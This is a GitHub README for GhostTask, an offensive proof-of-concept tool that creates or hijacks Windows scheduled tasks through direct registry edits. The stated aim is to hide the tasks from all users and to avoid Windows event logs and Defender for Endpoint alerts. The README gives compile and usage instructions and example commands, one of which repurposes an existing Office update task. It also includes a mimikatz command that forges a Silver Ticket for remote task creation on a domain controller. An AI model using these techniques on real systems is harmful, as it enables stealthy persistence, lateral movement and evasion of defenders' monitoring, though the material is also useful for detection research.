# Ghost Scheduled Task
While using scheduled tasks as a means of persistence is not a novel approach, threat actors have employed various techniques to conceal their malicious tasks. A notable method involves [removing the SD registry key](https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/), which represents the security descriptor, thereby obscuring the scheduled task from forensic investigations.

Inspired by [WithSecure](https://twitter.com/WithSecure)'s research on [Scheduled Task Tampering](https://labs.withsecure.com/publications/scheduled-task-tampering), they explained the feasibility of creating a scheduled task solely through registry key manipulation. Such an approach can bypass the generation of scheduled task creation event logs, like `4698` and `106`, offering a more stealth method of establishing persistence. In light of these insights, I've crafted this POC to demonstrate creating scheduled tasks via direct registry manipulation.

Given the undocumented nature of the registry key data structures related to scheduled tasks, my methodology for crafting them primarily relied on trial and error by comparing them with legitimate scheduled tasks. I also made references to the interfaces within `Taskschd.h` and drew extensively from [Cyber.WTF Windows Registry Analysis – Today's Episode: Tasks](https://cyber.wtf/2022/06/01/windows-registry-analysis-todays-episode-tasks/). This research was invaluable in guiding me to formulate the data structures for key registry components, such as `Triggers`, `Actions`, and `DynamicInfo`, which were essential to construct a functional scheduled task.

The tool offers the following features:
- Creates scheduled tasks with a restrictive security descriptor, making them invisible to all users.
- Establishes scheduled tasks directly via the registry, bypassing the generation of standard Windows event logs.
- Provides support to modify existing scheduled tasks without generating Windows event logs.
- Supports remote scheduled task creation (by using specially crafted Silver Ticket).

*Remark:
- As of October 21, 2023, this tool has been tested on Windows 10, Windows Server 2016, 2019, and 2022
- As of October 21, 2023, no alert and no scheduled task creation event (`ScheduledTaskCreated` action type) will be generated in MDE (Microsoft Defender For Endpoint)
- To create a scheduled task using this tool, **"NT AUTHORITY/SYSTEM"** privileges are required
- After configuring the scheduled task, you'll need to either **restart the system** or **await the next reboot** for the task to be loaded into the "Schedule" service process and subsequently executed

## Usage
```
Usage: GhostTask.exe <hostname/localhost> <operation> <taskname> <program> <argument> <username> <scheduletype> <time/second> <day>
- hostname/localhost: Remote computer name or "localhost".
- operation: add/delete
  - add: Create or modify a scheduled task using only registry keys. Requires restarting the "Schedule" service to load the task definition.
  - delete: Delete a scheduled task. Requires restarting the "Schedule" service to offload the task.
- taskname: Name of the scheduled task.
- program: Program to be executed.
- argument: Arguments for the program.
- username: User account under which the scheduled task will run.
- scheduletype: Supported triggers: second, daily, weekly, and logon.
- time/second (applicable for 'second', 'daily', and 'weekly' triggers):
  - For 'second' trigger: Specify the frequency in seconds for task execution.
  - For 'daily' and 'weekly' triggers: Specify the exact time (e.g., 22:30) for task execution.
- day (applicable for 'weekly' trigger): Days to execute the scheduled task (e.g., monday, thursday).
```

### Compile
```
x86_64-w64-mingw32-gcc GhostTask.c -o GhostTask.exe -lrpcrt4
```

## Examples
### 1. Create a new scheduled task that will call notepad.exe every Monday and Thursday at 2:12 pm:
```
GhostTask.exe localhost add demo "cmd.exe" "/c notepad.exe" LAB\Administrator weekly 14:12 monday,thursday
```
![HowTo](https://github.com/netero1010/GhostTask/raw/main/example1.png)

### 2. Modify existing scheduled task with new schedule type, user and program:
```
GhostTask.exe localhost add "Microsoft\Office\Office Automatic Updates 2.0" "cmd.exe" "/c notepad.exe" LAB\employee001 daily 20:37
```
![HowTo](https://github.com/netero1010/GhostTask/raw/main/example2.png)

### 3. Create a new scheduled task on remote computer:

As discussed in the WithSecure blog ([Extra: Lateral Movement](https://labs.withsecure.com/publications/scheduled-task-tampering) section), you can use specially crafted Silver Ticket to modify registry keys associated to scheduled tasks on . This allows you to create a scheduled task remotely.
```
kerberos::golden /domain:LAB.CORP /sid:S-1-5-21-1111111111-1111111111-1111111111 /aes256:[aes256hash] /user:Administrator /service:cifs /target:dc01.lab.corp /sids:S-1-5-18 /endin:600 /renewmax:10080
```

Create a new scheduled task on the DC01 server remotely, which will launch notepad.exe every day at 3:19 pm:
```
GhostTask.exe DC01.lab.corp add demo "cmd.exe" "/c notepad.exe" LAB\Administrator daily 15:19
```
![HowTo](https://github.com/netero1010/GhostTask/raw/main/example3.png)

## Credits
- [WithSecure](https://twitter.com/WithSecure) for their research [WithSecure Scheduled Task Tampering](https://labs.withsecure.com/publications/scheduled-task-tampering)
- [Cyber.WTF](https://cyber.wtf/) for their research [Windows Registry Analysis – Today’s Episode: Tasks](https://cyber.wtf/2022/06/01/windows-registry-analysis-todays-episode-tasks/)
- [ausecwa](https://github.com/ausecwa) for his [bof-registry](https://github.com/ausecwa/bof-registry)